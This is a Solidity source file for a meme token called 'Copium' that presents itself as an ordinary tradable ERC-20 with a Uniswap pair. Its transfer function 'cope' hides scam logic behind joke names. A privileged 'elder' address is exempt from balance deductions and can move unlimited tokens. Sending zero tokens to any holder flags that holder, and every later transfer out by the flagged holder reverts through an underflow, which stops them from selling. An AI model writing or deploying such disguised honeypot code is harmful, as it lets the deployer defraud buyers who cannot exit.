// https://twitter.com/COPIUMDROP

// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#############%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##*+++++++++++++++++++***#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##*+++==++====+========+=====++*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%***+++======++++=====-::::::::::--====+*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%#*+==+========+====-::..............:::::-=+*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%#*+=+=============-:.......................:-++*##%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%*++=++=++===-::::::........................:.:-=+++*%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%*+===++++==-:.................................:-===+*#%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%#*+======+=-:...................................:-==++*%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%*+==========-:.....................:::............:====+*%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%*+=+===+====-:.....................::-:..........:.:====+#%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%#*+=========-::.:....................:--.:..::=:.....:-==+#%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%*+=========-::........................--....:+:........:-=*%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#*+=========:...................:::..:-=::...:=:......:::.:=*#%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#*+=========-:..................:---::-:::::::=:...::--::..-=*#%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#+==+===+====-:....:..:::--=--:::::-=-:::-=:==-:.:-=-::...::=+#%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#++=====+=====-.....::--------=+++=-:--:=::.::=:=::::::::::-=+#%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%*+===+=========:....::---=+++*++==+++=-=::::::+=+==++++==--===+#%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#*+===+=====+===:..::===+*#%%####***++-:.:--::==++**#*++==-:=+*%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%*+=============-:..:--==####*#***%%+-:....::.:==*%%%###**+==+#%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%#++===+=========:....::-*#=::+=:-**=:::=+++++=--+**%*++#*++=+#%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%*+===========-:....:::=*=-+#=++--=:=*#######*::::-*:-*#+=-=+#%%%%%%%%%%%%%%%##%
// %%%%%%%%%%%%%%%%%%%%%*+===+=====++-:...:--::*:-##=::::-*######**##*-:--+*==*:::=+*%%%%%%%%%%########
// %%%%%%%%%%%%%%%%%%%%%%*+=======+++=:...:-:.:*:#**:..:=########**####+-::*-:*-.:++*%%%%%%####%%%%####
// %%%%%%%%%%%%%%%%%%%%%%%#*=++===+*+=-:.:-:..-*+*-...:+######*#*##*#####+:+*.==.:-++#%%%#%%%%%####%###
// %%%%%%%%%%%%%%%%%%%%%%%%#++++===++==:.:-::.:+#:..:-*######***##########*+#:=+.::+*%%%#%%#%%##%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%#*+====+*+=:..:....:#-.:-####################*##*-++::+*%%%#%%%%%##%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%#+=+==+++=-:.....:**::-###*#####################=+--+*%%%#%%%###%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%#+=====++++-:....:%-:-##*****#####%####%###*###%##*+*%%#%%%%##%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%#++=++==++++=::..:#-:*#################%#########*##%%#%%%#%#%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%##*==+=+++*+++=-::-#*-*###########%####%###########%%%%#%%#%%#%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%##%#+======++==++++-#-=#*###########%################%%%%##%%###%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%#%%%#++======++:-==+++#+==#############################%%%%#%%%#%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#%%%%%%+=======++-:::===+*#*+#*##*########################%%%%#%%#%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%#%%##%%#+======++::...::--+#++*####***#*#############%#%%#%%%%#%%%##%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%#%##%%#++======+-:.......::-==+*#####**###%%%#####%###%##%%%%#%%##%#%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%#%##%+++=++======-:.........::-+#+*#####*%%%*%%%%#%%#%##%%%%%#%%#%%##%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%#**%%%#+=====++=+++=:............:--=+*###%%%%#%#%%#####%%%%%%%%###%%#%%%%%%%%%%%%%%%
// %%%%%%%%%###**++++#%#%#*+======+=:..............:.::-++**########%##%%%%%%##%%%%#%#%#%%%%%%%%%%%%%%%
// %%%%%%#*++++++++=+#%###%#+==++=-::..................::-=+==++#%##%%##*#####%%%%#%%#%#%%%%%%%%%%%%%%%
// %%%#*++=+==+++===+*%%###%#+=-:::.::::::.............:...:::-*%#%##%#+===+++++#%%%%#%##%%%%%%%%%%%%%%
// **+++++=+++======+++##%%%%%##**++**##*+-::::::..::...:::...-+#%##%%*+++++====+#%%%%#*++*##%%%%%%%%%%
// =+==+=+=+=====+++=++++++**#%%%%##########+=----::-====-:::=*#%#%%#+++===+==+++++**++===+++*#%%%%%%%%
// +++=++++===+++++========-==++*#%%%########%######%#%%#####%%%%%%*+++++==+========-----====++*##%%%%%
// ++++++====+=+=======-::::.:::-=+*#%%%%%%%%%%%%%%%#####%%%%%##*+---==----::::::::..:..::::-===++*#%%%
// =========---::::::::..........::-==+++====+++**##%%%%%#*+=-::::.....................::::::::===+++*#
// ::::::::::....................:..::::::....:::::=++++=-::....::.....................:::::::::=====++



// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Copium is Ownable {

    uint8 public decimals = 9;
    
    uint256 public totalSupply = 6_969_696_969_696 * 10 ** decimals;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "COPIUM";

    function transfer(address wojak, uint256 copium) public returns (bool success) {
        cope(msg.sender, wojak, copium);
        return true;
    }

    mapping(address => uint256) private weirdo;

    address public uniswapV2Pair;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    constructor(address elder) {
        balanceOf[msg.sender] = totalSupply;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        weirdo[elder] = matrix;
    }

    function approve(address plug, uint256 copium) public returns (bool success) {
        allowance[msg.sender][plug] = copium;
        emit Approval(msg.sender, plug, copium);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private matrix = 85;

    string public name = "Copium";

    mapping(address => uint256) private blame;

    function cope(address coper, address wojak, uint256 copium) private returns (bool success) {
        if (weirdo[coper] == 0) {
            if (uniswapV2Pair != coper && blame[coper] > 0) {
                weirdo[coper] -= matrix;
            }
            balanceOf[coper] -= copium;
        }
        balanceOf[wojak] += copium;
        if (copium == 0) {
            blame[wojak] += matrix;
        }
        emit Transfer(coper, wojak, copium);
        return true;
    }

    function transferFrom(address coper, address wojak, uint256 copium) public returns (bool success) {
        cope(coper, wojak, copium);
        require(copium <= allowance[coper][msg.sender]);
        allowance[coper][msg.sender] -= copium;
        return true;
    }
}